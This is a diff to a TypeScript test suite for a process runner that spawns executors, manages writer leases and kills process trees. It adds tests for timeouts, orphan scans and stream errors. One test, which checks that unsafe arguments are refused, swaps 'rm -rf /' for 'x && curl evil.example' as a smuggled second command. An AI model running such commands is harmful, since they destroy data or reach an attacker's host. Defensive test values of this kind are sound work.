@@ -11,7 +11,7 @@ import assert from "node:assert/strict";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { Readable } from "node:stream";
+import { PassThrough, Readable } from "node:stream";
 import test from "node:test";
 import { createFixedClock } from "../src/bounded-log.js";
 import type { GitCommandResultV1, GitRunner } from "../src/git-truth.js";
@@ -1663,7 +1663,7 @@ test("a real child exit, a real orphan scan, and an explicit release free the wr
         lease: { kind: "PRODUCTION_WRITER", resource: "default", leaseId: "lease-pw-live-1" },
       }),
       {
-        clock: createFixedClock(NOW),
+        clock: { now: () => new Date().toISOString() },
         fs: createNodeRunFileSystem(),
         spawn: createNodeSpawner(),
         git: matchingGit(),
@@ -1697,7 +1697,7 @@ test("a real child exit, a real orphan scan, and an explicit release free the wr
         lease: { kind: "PRODUCTION_WRITER", resource: "default", leaseId: "lease-pw-live-2" },
       }),
       {
-        clock: createFixedClock(NOW),
+        clock: { now: () => new Date().toISOString() },
         fs: createNodeRunFileSystem(),
         spawn: createNodeSpawner(),
         git: matchingGit(),
@@ -2481,10 +2481,10 @@ test("exit 0 with a throwing scanner fails executorTreeIsGone", async () => {
   assert.ok(result.conjunction.failedConjuncts.includes("executorTreeIsGone"));
 });
 
-test("a clean run passes all eight success conjuncts", async () => {
+test("a clean run passes all nine success conjuncts", async () => {
   const result = await runWith({ neverWait: true });
   assert.equal(result.ok, true, result.reason);
-  assert.equal(result.conjunction.findings.length, 8);
+  assert.equal(result.conjunction.findings.length, 9);
   assert.deepEqual(result.conjunction.failedConjuncts, []);
   assert.ok(result.conjunction.findings.every((item) => item.ok));
 });
@@ -2620,7 +2620,7 @@ test("unsafe argv is refused before spawn", async () => {
       calls += 1;
       return exitingProcess();
     }) as SpawnFnV1,
-    request: { argv: ["--prompt-file", "C:/p.md; rm -rf /"] },
+    request: { argv: ["--flag", "x && curl evil.example"] },
   });
   assert.equal(result.spawned, false);
   assert.match(result.reason, /argv is not safe/);
@@ -2781,4 +2781,210 @@ test("a run longer than LEASE_TTL_MS keeps the lease unexpired via heartbeat", a
   assert.ok(Date.parse(held.expiresAt) > nowMs - 1, "heartbeat must keep the lease unexpired");
   hung.forceExit(1);
   await running;
+});
+
+test("a FOUND observation of a different pid does not make the run succeed", async () => {
+  const stranger: ProcessObservationV1 = {
+    outcome: "FOUND",
+    reason: "wrong-slot",
+    pid: 9999,
+    creationDate: T1,
+    executablePath: "C:\\Windows\\System32\\svchost.exe",
+  };
+  assert.equal(holderLiveness(RECORDED, stranger), "UNKNOWN");
+  const result = await runWith({
+    neverWait: true,
+    probe: sequentialProbe([foundObservation(RECORDED), stranger]),
+  });
+  assert.equal(result.ok, false, result.reason);
+  assert.ok(result.conjunction.failedConjuncts.includes("executorTreeIsGone"));
+});
+
+test("an undecidable orphan scan withholds the writer lease", async () => {
+  const leases = memoryLeases();
+  const result = await runWith({
+    neverWait: true,
+    leases,
+    request: { lease: { kind: "PRODUCTION_WRITER", resource: "default", leaseId: "lease-pw-undec" } },
+    scanOrphans: () => {
+      throw new Error("orphan scan unavailable: undecidable process-tree membership");
+    },
+  });
+  assert.equal(result.productionWriterLeaseReleasedByThisRun, false);
+  assert.equal(finding(result, "executorTreeIsGone").ok, false);
+});
+
+test("unreadable system rows with live parents do not withhold a writer lease", async () => {
+  const leases = memoryLeases();
+  const result = await runWith({
+    neverWait: true,
+    leases,
+    request: { lease: { kind: "PRODUCTION_WRITER", resource: "default", leaseId: "lease-pw-live" } },
+    scanOrphans: () => [
+      {
+        pid: 4,
+        parentPid: 0,
+        creationDate: "2026-01-01T00:00:00.000Z",
+        nonceReadable: false,
+        parentPresent: false,
+      },
+      {
+        pid: 100,
+        parentPid: 99,
+        creationDate: T1,
+        nonceReadable: false,
+        parentPresent: true,
+      },
+    ],
+  });
+  assert.equal(result.productionWriterLeaseReleasedByThisRun, true, result.reason);
+  assert.equal(leases.list().some((item) => item.leaseId === "lease-pw-live"), false);
+});
+
+test("a timeout with exit code 0 fails runCompletedWithinBudget", async () => {
+  const hung = hangingProcess();
+  hung.kill = () => {
+    hung.forceExit(0);
+  };
+  const result = await runWith({
+    spawn: trackingSpawn(() => hung),
+    request: { timeoutMs: 1 },
+    wait: async () => undefined,
+  });
+  assert.equal(result.cancel.timedOut, true);
+  assert.equal(result.exitCode, 0);
+  assert.equal(result.ok, false, result.reason);
+  assert.ok(result.conjunction.failedConjuncts.includes("runCompletedWithinBudget"));
+  assert.equal(finding(result, "runCompletedWithinBudget").ok, false);
+});
+
+test("a killTree throw after spawn persists that the tree was not observed gone", async () => {
+  const hung = hangingProcess();
+  const fs = memoryFs({
+    files: { [join(RUN_ROOT, "handoff.json")]: JSON.stringify(goodHandoff()) },
+  });
+  const result = await runWith({
+    fs,
+    spawn: trackingSpawn(() => hung),
+    request: { timeoutMs: 1 },
+    wait: async () => undefined,
+    killTree: () => {
+      throw new Error("taskkill.exe: access denied");
+    },
+  });
+  assert.equal(result.spawned, true);
+  assert.equal(result.ok, false);
+  assert.equal(result.cancel.timedOut, true);
+  assert.ok(result.cancel.stages.includes("SOFT"));
+  assert.ok(result.cancel.stages.includes("HARD"));
+  const persisted = JSON.parse(fs.files.get(join(RUN_ROOT, "result.json")) ?? "null") as {
+    conjunction: { findings: ReadonlyArray<{ name: string; ok: boolean }> };
+    cancel: { timedOut: boolean; stages: string[] };
+  };
+  const tree = persisted.conjunction.findings.find((item) => item.name === "executorTreeIsGone");
+  assert.equal(tree?.ok, false);
+  assert.equal(persisted.cancel.timedOut, true);
+});
+
+test("capture FOUND then probe UNAVAILABLE does not report the tree gone", async () => {
+  const result = await runWith({
+    neverWait: true,
+    probe: sequentialProbe([
+      foundObservation(RECORDED),
+      { outcome: "UNAVAILABLE", reason: "cim down" },
+    ]),
+  });
+  assert.equal(result.ok, false, result.reason);
+  assert.ok(result.conjunction.failedConjuncts.includes("executorTreeIsGone"));
+  assert.equal(finding(result, "executorTreeIsGone").ok, false);
+});
+
+test("without a captured identity the kill sweep still keeps the spawn floor and a foreign nonce", async () => {
+  const killed: number[] = [];
+  const childPid = RECORDED.pid;
+  const result = await runWith({
+    neverWait: true,
+    spawn: trackingSpawn(() => exitingProcess({ pid: childPid })),
+    probe: { observe: () => ({ outcome: "UNAVAILABLE", reason: "access-denied" }) },
+    scanOrphans: () => [
+      { pid: 1234, parentPid: childPid, creationDate: "2023-01-01T00:00:00.000Z" },
+      { pid: 1238, parentPid: childPid, creationDate: T0, runNonce: "nonce-other-run" },
+    ],
+    killTree: (pid) => {
+      killed.push(pid);
+    },
+  });
+  assert.equal(result.processIdentity, null);
+  assert.deepEqual(killed, []);
+});
+
+test("a stdout stream error before settleStreams still returns a RunResultV1", async () => {
+  const stdout = new PassThrough();
+  stdout.on("error", () => undefined);
+  let exited = false;
+  let resolveExit: ((value: { code: number | null; signal: string | null }) => void) | null = null;
+  const exit = new Promise<{ code: number | null; signal: string | null }>((resolve) => {
+    resolveExit = resolve;
+  });
+  const handle: SpawnHandleV1 = {
+    pid: RECORDED.pid,
+    stdout,
+    stderr: Readable.from([""]),
+    kill() {
+      if (!exited) {
+        exited = true;
+        resolveExit?.({ code: 0, signal: null });
+      }
+    },
+    exit,
+    get exited() {
+      return exited;
+    },
+  };
+  const err = Object.assign(new Error("read EPIPE"), { code: "EPIPE" });
+  queueMicrotask(() => {
+    stdout.destroy(err);
+  });
+  queueMicrotask(() => {
+    if (!exited) {
+      exited = true;
+      resolveExit?.({ code: 0, signal: null });
+    }
+  });
+  const leases = memoryLeases();
+  try {
+    const result = await runWith({
+      spawn: trackingSpawn(() => handle),
+      leases,
+      wait: async () => undefined,
+      request: {
+        timeoutMs: 30_000,
+        lease: { kind: "PRODUCTION_WRITER", resource: "default", leaseId: "lease-pw-epipe" },
+      },
+    });
+    assert.equal(typeof result.ok, "boolean");
+    assert.equal(result.spawned, true);
+    assert.equal(typeof result.productionWriterLeaseReleasedByThisRun, "boolean");
+  } finally {
+    stdout.destroy();
+  }
+});
+
+test("an R&D worktree path in argv still spawns and completes", async () => {
+  const rd = "C:\\Work\\R&D\\repo";
+  const fs = memoryFs({
+    dirs: [rd, RUN_ROOT],
+    files: { [join(RUN_ROOT, "handoff.json")]: JSON.stringify(goodHandoff()) },
+  });
+  const result = await runWith({
+    neverWait: true,
+    fs,
+    request: {
+      cwd: rd,
+      worktree: rd,
+      argv: ["--prompt-file", `${rd}\\PROMPT.md`, "--cwd", rd, "--no-plan"],
+    },
+  });
+  assert.equal(result.spawned, true, result.reason);
+  assert.equal(result.ok, true, result.reason);
 });
